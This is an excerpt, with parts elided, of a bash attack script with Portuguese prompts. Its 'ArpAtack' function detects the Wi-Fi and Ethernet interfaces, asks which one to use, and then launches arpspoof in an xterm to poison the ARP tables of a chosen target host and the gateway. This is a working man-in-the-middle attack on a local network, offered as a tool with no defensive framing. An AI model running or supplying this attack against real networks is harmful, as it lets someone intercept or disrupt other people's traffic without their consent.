...
ArpAtack(){
        ...
        echo "$host $route"
        interface_wlan=$(ip link show | grep 3: | cut -d " " -f2 | tr -d ":" | grep -v -e '^$')
        interface_eth=$(ip link show | grep 2: | cut -d " " -f2 | tr -d ":" | grep -v -e '^$')
        echo "Escolha a interface de rede"
        echo " 1 - Wi-fi"
        echo " 2 - Cabo"
        read -p "-->" opt
        case $opt in
                1)interface=$interface_wlan;;
                2)interface=$interface_eth;;
                *)printf "${RED}Opção inválida${NC}\n";sleep 2;ArpAtack;;
        esac
        echo $interface
        xterm -hold -e "arpspoof -i $interface -t $host -r $gatewai_host" &  
        menu
}
